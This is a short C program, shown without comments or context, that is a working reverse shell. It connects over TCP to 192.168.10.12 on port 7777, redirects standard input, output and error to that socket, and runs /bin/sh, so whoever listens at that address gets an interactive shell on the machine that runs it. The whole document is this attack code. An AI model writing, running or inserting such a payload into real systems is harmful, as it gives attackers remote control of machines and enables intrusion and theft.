#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main()
{
    struct sockaddr_in sa = {
        .sin_family = AF_INET,
        .sin_port = htons(7777),
        .sin_addr.s_addr = inet_addr("192.168.10.12")
    };

    int fd = socket(AF_INET, SOCK_STREAM, 0);

    connect(fd, (struct sockaddr *)&sa, sizeof(sa));

    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);

    return execve("/bin/sh", 0, 0);
}
